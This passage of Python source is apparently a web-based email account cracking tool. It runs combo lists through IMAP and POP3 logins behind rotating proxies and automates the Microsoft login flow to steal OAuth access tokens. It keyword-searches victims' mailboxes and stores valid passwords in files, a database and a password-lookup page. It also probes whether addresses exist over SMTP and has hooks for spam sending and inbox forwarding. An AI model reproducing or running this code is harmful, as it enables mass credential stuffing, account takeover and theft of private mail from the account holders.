        # Sender Stats
        self.sender_running = False; self.sent_count = 0; self.failed_count = 0
        self.inbox_count = 0; self.spam_count = 0; self.sender_log: List[str] = []
        self.smtp_log: List[str] = []
        self.smtp_cache: Dict[str, Any] = {}; self.is_extracting = False
        self.smtp_brute = False
        # Outlook Checker Stats
        self.outlook_checked = 0; self.outlook_hits = 0; self.outlook_custom = 0; self.outlook_bad = 0
        self.outlook_running = False; self.outlook_results: List[Dict[str, Any]] = []
        self.outlook_log: List[str] = []
        # OWA OAuth token cache: user -> {token, cid}
        self.oauth_tokens: Dict[str, Dict[str, str]] = {}
        self.owa_folder_map: Dict[str, Dict[str, str]] = {}
        # NEW: Comcast & Office365 Checker Stats
        self.comcast_checked = 0; self.comcast_live = 0; self.comcast_running = False
        self.office365_checked = 0; self.office365_live = 0; self.office365_running = False
        self.comcast_results: List[Dict[str, Any]] = []; self.office365_results: List[Dict[str, Any]] = []
        # NEW: Gmail Checker Stats
        self.gmail_checked = 0; self.gmail_live = 0; self.gmail_running = False
        self.gmail_results: List[Dict[str, Any]] = []
        # NEW: Inbox Forwarding Stats
        self.forward_running = False; self.forward_total = 0; self.forward_success = 0; self.forward_failed = 0
        self.forward_log: List[str] = []; self.forward_results: List[Dict[str, Any]] = []
        # NEW: Security & Multi-Pass Stats
        self.two_factor = 0; self.multi_pass_hits = 0; self.bad_pass = 0
        self.duplicates = 0 # Track duplicate combos found during extraction
        
        # SMS Notification Settings - REMOVED

        self.load_settings()

    def load_settings(self):
        try:
            conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
            cursor.execute("SELECT key, value FROM settings")
            for key, val in cursor.fetchall():
                if key == 'max_retries': self.max_retries = int(val)
                elif key == 'retry_delay': self.retry_delay = int(val)
                elif key == 'timeout': self.timeout = int(val)
                elif key == 'timeout': self.timeout = int(val)
            conn.close()
        except: pass

    def save_setting(self, key, val):
        try:
            conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
            cursor.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, str(val)))
            conn.commit(); conn.close()
            if key == 'max_retries': self.max_retries = int(val)
            elif key == 'retry_delay': self.retry_delay = int(val)
            elif key == 'timeout': self.timeout = int(val)
            elif key == 'sms_enabled': self.sms_enabled = val == 'True'
            elif key == 'sms_phone': self.sms_phone = val
            elif key == 'sms_smtp_host': self.sms_smtp_host = val
            elif key == 'sms_smtp_port': self.sms_smtp_port = int(val)
            elif key == 'sms_smtp_user': self.sms_smtp_user = val
            elif key == 'sms_smtp_pass': self.sms_smtp_pass = val
            elif key == 'sms_smtp_sec': self.sms_smtp_sec = val
        except: pass

state = GlobalState()

@asynccontextmanager
async def lifespan(app: FastAPI):
    init_db()
    yield

app = FastAPI(lifespan=lifespan)

@app.get("/health")
def health():
    return {"status": "ok", "routes": [r.path for r in app.routes]}

@app.get("/mail_viewer")
async def mail_viewer(email: str = None):
    """Mobile-friendly viewer for email credentials."""
    html = """
    <html><head><meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
    body{font-family:Arial,sans-serif;background:#111;color:#eee;padding:20px}
    .container{max-width:600px;margin:auto}
    input{width:100%;padding:10px;margin:10px 0;font-size:1rem}
    button{padding:10px 20px;font-size:1rem;background:#1ed760;color:#000;border:none;border-radius:4px;cursor:pointer}
    .result{margin-top:20px;padding:10px;background:#222}
    </style>
    </head><body><div class="container">
    <h2>Mail Viewer</h2>
    <form method="get">
    <input type="text" name="email" placeholder="Enter email" required/>
    <button type="submit">Lookup</button>
    </form>
    %s
    </div></body></html>
    """
    result_html = ""
    if email:
        for e, p in ACCOUNTS:
            if e.lower() == email.lower():
                result_html = f"<div class='result'><strong>{e}:</strong> {p}</div>"
                break
        else:
            result_html = "<div class='result'>Account not found.</div>"
    return HTMLResponse(content=html % result_html)

@app.websocket("/stats_ws")
async def ws_stats(websocket: WebSocket):
    await websocket.accept()
    while True:
        try:
            active_is_scanner = state.is_running
            active_is_smtp = state.smtp_running
            curr_checked = state.checked if active_is_scanner else (state.smtp_checked if active_is_smtp else 0)
            el = time.time() - state.start_time if (active_is_scanner or active_is_smtp) else 0.0
            cpm = (float(curr_checked) / el * 60) if el > 1.0 else 0.0

            # Efficient slicing to avoid copying huge lists
            try:
                with state.lock:
                    live_hits_slice      = list(state.live_hits[-10:])
                    search_results_slice = list(state.search_results[-20:])
                    smtp_results_slice   = list(state.smtp_results[-10:])
                    sender_log_slice     = list(state.sender_log[-10:])
                    smtp_log_slice       = list(state.smtp_log[-10:])
                    outlook_results_slice= list(state.outlook_results[-15:])
                    outlook_log_slice    = list(state.outlook_log[-12:])
            except Exception:
                await asyncio.sleep(1)
                continue

            payload = {
                "checked":      getattr(state, 'checked',        0),
                "valid":        getattr(state, 'valid',          0),
                "bad":          getattr(state, 'bad',            0),
                "cpm":          round(cpm),
                "is_running":   getattr(state, 'is_running',     False),
                "live":         live_hits_slice,
                "disc_total":   getattr(state, 'disc_total',     0),
                "disc_done":    getattr(state, 'disc_done',      0),
                "disc_found":   getattr(state, 'disc_found',     0),
                "disc_running": getattr(state, 'disc_running',   False),
                "s_res":        search_results_slice,
                "smtp_checked": getattr(state, 'smtp_checked',   0),
                "smtp_live":    getattr(state, 'smtp_live',       0),
                "smtp_bad":     getattr(state, 'smtp_bad',        0),
                "smtp_running": getattr(state, 'smtp_running',   False),
                "smtp_hits":    smtp_results_slice,
                "sent":         getattr(state, 'sent_count',     0),
                "failed":       getattr(state, 'failed_count',   0),
                "inbox":        getattr(state, 'inbox_count',    0),
                "spam":         getattr(state, 'spam_count',     0),
                "sender_log":   sender_log_slice,
                "sender_running": getattr(state, 'sender_running', False),
                "is_extracting": getattr(state, 'is_extracting', False),
                "search_count": getattr(state, 'search_count',  0),
                "search_hits":  getattr(state, 'search_hits',   0),
                "search_running": getattr(state, 'search_running', False),
                "search_results": search_results_slice,
                "smtp_log":     smtp_log_slice,
                "outlook_checked": getattr(state, 'outlook_checked', 0),
                "outlook_hits": getattr(state, 'outlook_hits',  0),
                "outlook_custom": getattr(state, 'outlook_custom', 0),
                "outlook_bad":  getattr(state, 'outlook_bad',   0),
                "outlook_running": getattr(state, 'outlook_running', False),
                "outlook_hits_list": outlook_results_slice,
                "outlook_log":  outlook_log_slice,
                "gmail_checked": getattr(state, 'gmail_checked', 0),
                "gmail_live":   getattr(state, 'gmail_live',    0),
                "two_factor":   getattr(state, 'two_factor',    0),
                "multi_pass_hits": getattr(state, 'multi_pass_hits', 0),
                "duplicates":   getattr(state, 'duplicates',    0),
            }
            await websocket.send_json(payload)
            await asyncio.sleep(0.5)
        except (RuntimeError, Exception) as _ws_err:
            # Only break on actual WebSocket disconnect errors
            _msg = str(_ws_err).lower()
            if any(x in _msg for x in ('disconnect', 'closed', 'close', 'connection', 'websocket')):
                break
            # Otherwise it's a transient error — wait and retry
            await asyncio.sleep(1)

def get_user_pass_list(combo: Any) -> tuple[str, List[str]]:
    if not combo: return "", []
    p = str(combo).strip().split(':', 1)
    if len(p) >= 2:
        email = p[0].strip()
        passes_raw = p[1].strip()
        # Support comma separated passwords or single password
        passwords = [px.strip() for px in passes_raw.split(',') if px.strip()]
        return email, passwords
    return "", []

def get_user_pass(combo: Any) -> tuple[str, str]:
    u, ps = get_user_pass_list(combo)
    return u, ps[0] if ps else ""


def on_success(u: str, p: str, srv: str, proto: str):
    with state.lock:
        state.valid += 1
        state.live_hits.append({"user":u,"pass":p,"srv":srv,"proto":proto,"time":time.strftime("%H:%M")})
    try:
        line = f"{u}:{p} | {proto}://{srv} | {SIGNATURE}\n"
        with open(VALID_PATH, 'a', encoding='utf-8') as f: f.write(line)
        with open('hits.txt', 'a', encoding='utf-8') as f: f.write(f"{u}:{p}\n")
        if state.session_dir:
            pth = os.path.join(state.session_dir, 'hits.txt')
            with open(pth, 'a', encoding='utf-8') as f: f.write(f"{u}:{p}\n")
            
        conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
        cursor.execute("CREATE TABLE IF NOT EXISTS hits_history (user TEXT, pass TEXT, srv TEXT, proto TEXT, time TEXT, UNIQUE(user, pass))")
        cursor.execute("INSERT OR IGNORE INTO hits_history (user, pass, srv, proto, time) VALUES (?, ?, ?, ?, ?)", (u, p, srv, proto, time.strftime("%H:%M")))
        conn.commit(); conn.close()
        
    except: pass

def check_port(h, p, timeout=2):
    try:
        with socket.create_connection((h, p), timeout=timeout): return True
    except: return False

def discover_domain_worker(domain: str):
    if state.stop_requested: return
    domain = domain.lower()
    if get_provider(domain) or get_mx_imap(domain):
        with state.lock: state.disc_done += 1; state.disc_found += 1
        return
    ih = f"imap.{domain}"; ip = 993; ph = f"pop.{domain}"; pp = 995; found = False
    for px in ["imap.", "mail.", "imaps.", "pop."]:
        host = f"{px}{domain}"
        if check_port(host, 993): ih, ip, found = host, 993, True; break
        elif check_port(host, 143): ih, ip, found = host, 143, True; break
    for px in ["pop.", "pop3.", "mail.", "imap."]:
        host = f"{px}{domain}"
        if check_port(host, 995): ph, pp, found = host, 995, True; break
        elif check_port(host, 110): ph, pp, found = host, 110, True; break
    if found:
        save_provider(domain, ih, ip, ph, pp, f"smtp.{domain}", 587)
        with state.lock: state.disc_found += 1
    with state.lock: state.disc_done += 1

@app.post("/api/discover")
async def api_discover(req: Request, bt: BackgroundTasks):
    d = await req.json()
    combos = [str(c).strip() for c in d.get('combos', []) if ':' in str(c)]
    file_path = d.get('file_path', '')
    
    dom_set = set()
    for c in combos:
        u, _ = get_user_pass_list(c)
        if u and '@' in u: dom_set.add(u.split('@')[-1].lower())
    
    if file_path and os.path.exists(file_path):
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    if len(dom_set) > 5000: break # Safety limit
                    u, _ = get_user_pass_list(line.strip())
                    if u and '@' in u: dom_set.add(u.split('@')[-1].lower())
        except: pass

    domains = [dom for dom in dom_set if not any(m in dom for m in MICROSOFT) and not any(g in dom for g in GMAIL) and 'yahoo' not in dom]
    state.disc_total = len(domains); state.disc_done = 0; state.disc_found = 0; state.disc_running = True; state.stop_requested = False
    
    def run_disc():
        if domains:
            with ThreadPoolExecutor(max_workers=50) as ex:
                for dom in domains:
                    if state.stop_requested: break
                    ex.submit(discover_domain_worker, dom) # pyre-ignore[d193bb82-2f74-436c-bc96-2b1f113d2562]
        state.disc_running = False
        
    bt.add_task(run_disc)
    return {"ok": True, "total": len(domains)}

def _make_proxy_socket(proxy_cfg: dict, target_host: str, target_port: int, timeout: int) -> 'socks.socksocket':
    """Create a connected socks socket through the given proxy config."""
    s = socks.socksocket()
    s.settimeout(timeout)
    s.set_proxy(
        proxy_cfg['type'],
        proxy_cfg['host'],
        proxy_cfg['port'],
        username=proxy_cfg.get('username'),
        password=proxy_cfg.get('password')
    )
    s.connect((target_host, target_port))
    return s

def scan_worker(combo: str):
    if state.stop_requested: return
    user, passwords = get_user_pass_list(combo)
    if not user or not passwords:
        with state.lock: state.checked += 1; state.bad += 1; return
    
    ih, ip, ph, pp, _, _ = discover_server(user.split('@')[-1])
    is_ms = any(m in user.lower() for m in MICROSOFT)
    
    # Pick a random proxy for this worker (if proxies configured)
    proxy_cfg = random.choice(state.parsed_proxies) if state.parsed_proxies else None

    # Multi-password success tracking
    def log_multi_pass_hit(pwd_idx):
        if pwd_idx > 0:
            with state.lock: state.multi_pass_hits += 1

    success = False
    for pwd in passwords:
        if state.stop_requested or success: break
        
        hosts_to_try = [(ih, ip)]
        if is_ms and ih == "outlook.office365.com":
            hosts_to_try.append(("imap-mail.outlook.com", 993))
            
        # --- IMAP (with optional proxy) ---
        for h, p in hosts_to_try:
            try:
                if proxy_cfg:
                    m = ProxyIMAP_SSL(h, p, timeout=state.timeout, ssl_context=ctx, proxy_config=proxy_cfg)
                    m.login(user, pwd)
                    m.select('INBOX', readonly=True)
                    m.logout()
                else:
                    def _do_imap(h=h, p=p, u=user, pw=pwd):
                        with imaplib.IMAP4_SSL(h, p, timeout=state.timeout, ssl_context=ctx) as m:
                            m.login(u, pw)
                            m.select('INBOX', readonly=True)
                            m.logout()
                    safe_execute_with_retry(_do_imap)

                on_success(user, pwd, h, "IMAP")
                log_multi_pass_hit(passwords.index(pwd))
                success = True; break
            except imaplib.IMAP4.error as e:
                err_str = str(e).lower()
                if "web login required" in err_str or "second factor required" in err_str or "challenge required" in err_str or "application-specific password required" in err_str:
                    with state.lock: state.two_factor += 1
                continue
            except: continue
        
        if success: break

        # --- POP3 (with optional proxy) ---
        pop_hosts = [(ph, pp)]
        if is_ms and ph == "outlook.office365.com": pop_hosts.append(("pop-mail.outlook.com", 995))
        for h, p in pop_hosts:
            try:
                if proxy_cfg:
                    mpop = ProxyPOP3_SSL(h, p, timeout=state.timeout, context=ctx, proxy_config=proxy_cfg)
                    mpop.user(user); mpop.pass_(pwd); mpop.quit()
                else:
                    def _do_pop(h=h, p=p):
                        mpop = poplib.POP3_SSL(h, p, timeout=state.timeout, context=ctx)
                        mpop.user(user); mpop.pass_(pwd); mpop.quit()
                    safe_execute_with_retry(_do_pop)
                on_success(user, pwd, h, "POP3")
                log_multi_pass_hit(passwords.index(pwd))
                success = True; break
            except: continue
            
        if success: break

        # --- IMAP-TLS (STARTTLS, with optional proxy) ---
        try:
            if proxy_cfg:
                m = ProxyIMAP(ih, 143, timeout=state.timeout, proxy_config=proxy_cfg)
                m.starttls(ssl_context=ctx); m.login(user, pwd); m.logout()
            else:
                def _do_imap_tls():
                    with imaplib.IMAP4(ih, 143, timeout=state.timeout) as m:
                        m.starttls(ssl_context=ctx); m.login(user, pwd); m.logout()
                safe_execute_with_retry(_do_imap_tls)
            on_success(user, pwd, ih, "IMAP-TLS")
            log_multi_pass_hit(passwords.index(pwd))
            success = True; break
        except: pass
        
    with state.lock: state.checked += 1
    if not success:
        with state.lock: state.bad += 1
    elif len(passwords) > 1:
        pass

@app.post("/api/start")
async def api_start(req: Request, bt: BackgroundTasks):
    d = await req.json()
    state.combos = [str(c).strip() for c in d.get('combos', []) if ':' in str(c)]
    file_path = d.get('file_path', '')
    
    try: state.threads = int(d.get('threads', 100))
    except: state.threads = 100
    raw_proxies = d.get('proxies', [])
    if isinstance(raw_proxies, str):
        raw_proxies = [l.strip() for l in raw_proxies.splitlines() if l.strip()]
    state.proxies = [str(x).strip() for x in raw_proxies if x]
    state.parsed_proxies = [p for p in (parse_proxy_string(px) for px in state.proxies) if p]
    
    # Create Session Folder
    now = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    state.session_dir = f"Results_{now}"
    if not os.path.exists(state.session_dir): os.makedirs(state.session_dir)
    
    state.is_running = True; state.stop_requested = False; state.checked = 0; state.valid = 0; state.bad = 0; state.start_time = time.time()
    
    def run_scan():
        with ThreadPoolExecutor(max_workers=state.threads) as ex:
            # Mode 1: List from memory
            if state.combos:
                for combo in state.combos:
                    if state.stop_requested: break
                    ex.submit(scan_worker, combo)
            
            # Mode 2: Stream from file (Large file support)
            if file_path and os.path.exists(file_path):
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        for line in f:
                            if state.stop_requested: break
                            combo = line.strip()
                            if ':' in combo:
                                ex.submit(scan_worker, combo)
                except Exception as e:
                    logger.error(f"Error streaming large file: {e}")

        state.is_running = False
        
    bt.add_task(run_scan)
    return {"ok": True, "session": state.session_dir}

@app.post("/api/stop")
def api_stop(): 
    state.stop_requested = True
    state.is_running = False
    state.disc_running = False
    state.smtp_running = False
    state.sender_running = False
    state.search_running = False
    state.outlook_running = False
    return {"ok": True}

@app.post("/api/clear")
def api_clear():
    with state.lock:
        state.live_hits = []
        state.checked = 0
        state.valid = 0
        state.bad = 0
    return {"ok": True}

@app.post("/api/clear-database")
def clear_database():
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute("DELETE FROM hits_history")
        conn.commit()
        conn.close()
        # Also clear the Valid.txt file
        if os.path.exists(VALID_PATH):
            with open(VALID_PATH, 'w', encoding='utf-8') as f:
                f.write("")
        return {"ok": True}
    except Exception as e:
        return {"ok": False, "error": str(e)}

@app.get("/api/settings")
def get_settings():
    return {
        "max_retries": state.max_retries,
        "retry_delay": state.retry_delay,
        "timeout": state.timeout
    }

@app.post("/api/settings")
async def update_settings(req: Request):
    d = await req.json()
    if 'max_retries' in d: state.save_setting('max_retries', d['max_retries'])
    if 'retry_delay' in d: state.save_setting('retry_delay', d['retry_delay'])
    if 'timeout' in d: state.save_setting('timeout', d['timeout'])
    return {"ok": True}

@app.get("/api/extractor/stats")
def get_extractor_stats():
    return {
        "running": state.search_running,
        "checked": state.checked,
        "hits": state.valid,
        "stop_requested": state.stop_requested
    }

@app.post("/api/domain/mapping")
async def save_domain_mapping(req: Request):
    try:
        d = await req.json()
        dom = d.get('domain').lower().strip()
        ih = d.get('imap_host'); ip = int(d.get('imap_port'))
        ph = d.get('pop_host'); pp = int(d.get('pop_port'))
        sh = d.get('smtp_host'); sp = int(d.get('smtp_port'))
        state.save_provider(dom, ih, ip, ph, pp, sh, sp)
        return {"ok": True}
    except Exception as e: return {"ok": False, "error": str(e)}


# --- OUTLOOK MAIL CHECKER & KEYWORDS FINDER ---

def outlook_check_worker(combo: str, keywords: List[str]):
    if state.stop_requested: return
    user, passwords = get_user_pass_list(combo)
    if not user or not passwords:
        with state.lock: state.outlook_checked += 1; state.outlook_bad += 1; return
    
    auth_url = f"https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={user}&client_id=9e5f94bc-e8a4-4e73-b8be-63364c29d753&mkt=en&response_type=code&redirect_uri=https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FIMAP.AccessAsUser.All%20https%3A%2F%2Foutlook.office.com%2FSMTP.Send"
    headers = {
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Thunderbird/115.0",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "accept-encoding": "gzip, deflate",
        "accept-language": "en-US,en;q=0.9"
    }
    
    sess = requests.Session()
    try:
        r1 = sess.get(auth_url, headers=headers, timeout=20)
        
        # Robust Parse PPFT
        ppft = ""
        m = re.search(r'name="PPFT".*?value="([^"]+)"', r1.text)
        if not m: m = re.search(r'name=\\"PPFT\\".*?value=\\"([^\\"]+)\\"', r1.text)
        if not m: m = re.search(r'sFTTag:".*?value=\\"([^\\"]+)\\"', r1.text)
        if not m: m = re.search(r'sPPFT:\'(.+?)\'', r1.text)
        if m: ppft = m.group(1)
        
        # Robust Parse urlPost
        post_url = ""
        pu = re.search(r'"urlPost":"([^"]+)"', r1.text)
        if not pu: pu = re.search(r'urlPost:\\"([^\\"]+)\\"', r1.text)
        if not pu: pu = re.search(r'urlPost:\'([^\']+)\'', r1.text)
        if pu: post_url = pu.group(1).replace("\\", "")
        
        if not ppft or not post_url:
             if "IfExistsResult\":1" in r1.text or "ErrorHR" in r1.text:
                 with state.lock: state.outlook_bad += 1; state.outlook_checked += 1; state.outlook_log.append(f"FAILED: {user} | Invalid Account"); return
             db_p = f"C:\\tmp\\outlook_debug_{user.split('@')[0]}.html"
             try:
                 os.makedirs("C:\\tmp", exist_ok=True)
                 with open(db_p, 'w', encoding='utf-8') as f_db: f_db.write(r1.text)
             except: pass
             with state.lock: state.outlook_bad += 1; state.outlook_checked += 1; state.outlook_log.append(f"ERROR: {user} | Parse Failed (see {db_p})"); return
             
        # Phase 2: Login POST
        success = False
        for pwd in passwords:
            if state.stop_requested or success: break
            
            sess = requests.Session() # New session per password attempt
            r1 = sess.get(auth_url, headers=headers, timeout=20)
            
            m = re.search(r'name="PPFT".*?value="([^"]+)"', r1.text)
            if not m: m = re.search(r'name=\\"PPFT\\".*?value=\\"([^\\"]+)\\"', r1.text)
            if m: ppft = m.group(1)
            
            pu = re.search(r'"urlPost":"([^"]+)"', r1.text)
            if not pu: pu = re.search(r'urlPost:\\"([^\\"]+)\\"', r1.text)
            if pu: post_url = pu.group(1).replace("\\", "")
            
            if not ppft or not post_url: continue

            payload = f"i13=1&login={user}&loginfmt={user}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={pwd}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=Passport&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772"
            headers_post = headers.copy()
            headers_post.update({
                "Host": "login.live.com",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": str(len(payload)),
                "Origin": "https://login.live.com",
                "Referer": r1.url,
                "User-Agent": "Mozilla/5.0 (Linux; Android 9; V2218A Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0"
            })
            
            r2 = sess.post(post_url, data=payload, headers=headers_post, allow_redirects=False, timeout=20)
            
            # Success check
            location = r2.headers.get('Location', '')
            
            if "code=" in location or "JSH" in str(sess.cookies.get_dict()) or "JSHP" in str(sess.cookies.get_dict()) or "Consent/Update" in r2.text or "oauth20_desktop.srf" in location:
                success = True
            elif "TwoFactor" in r2.text or "Challenge" in r2.text or "Sms" in r2.text or "App" in r2.text:
                with state.lock: state.two_factor += 1; continue
            else:
                continue

            # SAVE VALID LOGIN (Any valid login is a HIT)
            with state.lock:
                state.outlook_hits += 1
                state.outlook_log.append(f"HIT: {user} | Login Valid")
            
            on_success(user, pwd, "login.live.com", "WEBAuth")
            if passwords.index(pwd) > 0:
                with state.lock: state.multi_pass_hits += 1
            
            save_dir = os.path.join(HITS_FOLDER, "Outlook_Checker")
            os.makedirs(save_dir, exist_ok=True)
            with open(os.path.join(save_dir, "valid_logins.txt"), "a", encoding="utf-8") as f_v:
                f_v.write(f"{user}:{pwd}\n")
            
            # (Success found, exit password loop)
            break
            
        if not success:
            with state.lock: state.outlook_bad += 1; state.outlook_checked += 1; state.outlook_log.append(f"FAILED: {user} | No valid passwords found"); return


        # Extract code and proceed
        code = ""
        code_match = re.search(r'code=([^&]+)', location)
        if code_match: code = code_match.group(1)
        else:
            if "/cancel?mkt" in r2.text:
                try:
                    opt = re.search(r'opidt%3d([^"]+)"', r2.text).group(1) # pyre-ignore
                    op = re.search(r'opid%3d([^%]+)%26', r2.text).group(1) # pyre-ignore
                    uaid = re.search(r'ame="uaid" id="uaid" value="([^"]+)"', r2.text).group(1) # pyre-ignore
                    hop_url = f"https://login.live.com/oauth20_authorize.srf?uaid={uaid}&client_id=9e5f94bc-e8a4-4e73-b8be-63364c29d753&opid={op}&mkt=EN-US&opidt={opt}&res=success&route=C105_BAY"
                    r_hop = sess.get(hop_url, headers=headers_post, allow_redirects=False)
                    location = r_hop.headers.get('Location', '')
                    code_match = re.search(r'code=([^&]+)', location)
                    if code_match: code = code_match.group(1)
                except: pass

        if not code:
            with state.lock: state.outlook_log.append(f"CAPTURE: {user} | Code extraction failed"); return

        # Phase 3: Get Token
        token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
        token_payload = f"client_info=1&client_id=9e5f94bc-e8a4-4e73-b8be-63364c29d753&redirect_uri=https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FIMAP.AccessAsUser.All%20https%3A%2F%2Foutlook.office.com%2FSMTP.Send"
        r_token = sess.post(token_url, data=token_payload, headers={"User-Agent": "Mozilla/5.0"}, timeout=20)
        auth_token = r_token.json().get('access_token')
        
        if not auth_token:
            with state.lock: state.outlook_log.append(f"CAPTURE: {user} | Token acquisition failed"); return

        cid = sess.cookies.get('MSPCID', '').upper()
        # Store OAuth token for OWA mail viewer
        with state.lock:
            state.oauth_tokens[user] = {"token": auth_token, "cid": cid}
        
        total_mails = 0
        formatted_keywords = ""
        
        # OPTIONAL: If keywords provided, search for them in inbox
        if keywords:
            # More specific OWA search syntax to target Subject/Body for each keyword
            formatted_keywords = " OR ".join([f'(subject:"{k}" OR body:"{k}")' for k in keywords])
            search_payload = {
                "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "Egypt Standard Time",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}, {"Term": {"DistinguishedFolderName": "DeletedItems"}}]},
                    "From": 0,
                    "Query": {"QueryString": formatted_keywords},
                    "Size": 25,
                    "Sort": [{"Field": "Score", "SortDirection": "Desc", "Count": 3}, {"Field": "Time", "SortDirection": "Desc"}],
                    "EnableTopResults": True,
                    "TopResultsCount": 3
                }]
            }
            
            try:
                headers_search = {"Authorization": f"Bearer {auth_token}", "X-AnchorMailbox": f"CID:{cid}", "Content-Type": "application/json"}
                r_search = sess.post("https://outlook.live.com/search/api/v2/query", json=search_payload, headers=headers_search, timeout=20)
                search_data = r_search.text
                
                total_match = re.search(r'"Total":(\d+)', search_data)
                total_mails = int(total_match.group(1)) if total_match else 0
            except:
                total_mails = 0
        
        # Log results
        with state.lock:
            state.outlook_checked += 1
            state.outlook_hits += 1  # All successful logins are hits
            res_item = {"user": user, "pass": pwd, "mails": total_mails, "kw_match": total_mails > 0}
            state.outlook_results.append(res_item)
            
            # Detailed Capture Formatting
            if keywords:
                capture = f"Login Valid | Mails with keywords: {total_mails} | CID: {cid}"
                if total_mails >= 1:
                    state.outlook_custom += 1
                    state.outlook_log.append(f"✓ KEYWORD MATCH: {user} | {total_mails} emails found | Keywords: {formatted_keywords}")
                    with open(os.path.join(save_dir, "custom_hits.txt"), "a", encoding="utf-8") as f_c:
                        f_c.write(f"{user}:{pwd} | {capture} | Keywords: {formatted_keywords}\n")
                else:
                    state.outlook_log.append(f"✓ LOGIN VALID: {user} | No keywords matched | CID: {cid}")
                    with open(os.path.join(save_dir, "hits_valid_login.txt"), "a", encoding="utf-8") as f_h:
                        f_h.write(f"{user}:{pwd} | {capture}\n")
            else:
                # No keywords - just checking login
                capture = f"Login Valid | CID: {cid}"
                state.outlook_log.append(f"✓ LOGIN VALID: {user} | {capture}")
                with open(os.path.join(save_dir, "hits_valid_login.txt"), "a", encoding="utf-8") as f_h:
                    f_h.write(f"{user}:{pwd} | {capture}\n")

    except requests.exceptions.TooManyRedirects:
        with state.lock:
            state.outlook_checked += 1
            state.outlook_bad += 1
            state.outlook_log.append(f"ERROR: {user} (Too Many Redirects - likely blocked)")
    except Exception as e:
        with state.lock:
            state.outlook_checked += 1
            state.outlook_bad += 1
            state.outlook_log.append(f"ERROR: {str(combo)[:20]}... ({str(e)[:30]})")  # pyre-ignore[1fc9dcdc,60097146,8615f0c3,52ed1eb2]

@app.post("/api/outlook/start")
async def api_outlook_start(req: Request, bt: BackgroundTasks):
    d = await req.json()
    combos = d.get('combos', [])
    threads = int(d.get('threads', 50))
    keywords = d.get('keywords', '').strip().split()
    
    state.outlook_running = True
    state.stop_requested = False
    state.outlook_checked = 0
    state.outlook_hits = 0
    state.outlook_bad = 0
    state.outlook_results = []
    state.outlook_log = ["OUTLOOK ENGINE STARTED..."]
    state.start_time = time.time()
    
    def run_outlook():
        if combos:
            executor = ThreadPoolExecutor(max_workers=threads)
            # Submit in chunks to avoid overwhelming memory and slow start
            chunk_size = 500
            for i in range(0, len(combos), chunk_size):
                if state.stop_requested: break
                chunk = combos[i:i+chunk_size]
                for combo in chunk:
                    executor.submit(outlook_check_worker, str(combo), keywords)  # pyre-ignore[8d390f26]
            executor.shutdown(wait=False)
        state.outlook_running = False
        
    bt.add_task(run_outlook)
    return {"ok": True}


# --- MAIL PROVIDER EXISTENCE CHECKS ---

async def code250(mailProvider: str, target: str, timeout: int = 10) -> tuple[List[str], str]:
    providerLst: List[str] = []
    error: str = ''

    randPref = ''.join(random.sample(s.ascii_lowercase, 6))
    fromAddress = f"{randPref}@{mailProvider}"
    targetMail = f"{target}@{mailProvider}"

    records = dns.resolver.Resolver().resolve(mailProvider, 'MX')
    mxRecord = records[0].exchange
    mxRecord = str(mxRecord)

    try:
        server = aiosmtplib.SMTP(timeout=timeout, validate_certs=False)
        # server.set_debuglevel(0)

        await server.connect(hostname=mxRecord)
        await server.helo()
        await server.mail(fromAddress)
        code, message = await server.rcpt(targetMail)

        if code == 250:
            providerLst.append(targetMail)

        message_str = message.lower()
        if 'ban' in message_str or 'denied' in message_str:
            error = message_str

    except aiosmtplib.errors.SMTPRecipientRefused:
        pass
    except Exception as e:
        logger.error(e, exc_info=True)
        error = str(e)

    return providerLst, error


async def gmail(target: str, req_session_fun: Any, *args: Any, **kwargs: Any) -> tuple[Dict[str, Any], str]:
    result: Dict[str, Any] = {}
    chk_result = await code250("gmail.com", target, kwargs.get('timeout', 10))
    gmailChkLst, error = chk_result[0], chk_result[1]
    if gmailChkLst:
        result["Google"] = gmailChkLst[0]

    await asyncio.sleep(0)
    return result, error


async def yandex(target: str, req_session_fun: Any, *args: Any, **kwargs: Any) -> tuple[Dict[str, Any], str]:
    result: Dict[str, Any] = {}
    yaAliasesLst = ["yandex.by",
                    "yandex.kz",
                    "yandex.ua",
